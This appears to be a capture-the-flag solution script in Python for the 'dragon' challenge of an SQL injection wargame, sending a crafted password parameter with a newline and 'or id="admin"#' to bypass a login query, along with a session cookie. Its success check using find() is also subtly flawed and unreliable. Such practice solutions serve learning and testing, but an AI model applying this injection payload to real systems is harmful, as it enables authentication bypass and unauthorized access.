import requests
url = "https://los.rubiya.kr/chall/dragon_51996aa769df79afbf79eb4d66dbcef6.php"
cookie = {"PHPSESSID":"ijo071u48pl1ov7p0omre249qv"}

if requests.get(url, {"pw" : "'\n and 0 or id=\"admin\"#"}, cookies=cookie).text.find("Clear!"): print("[*] Success")
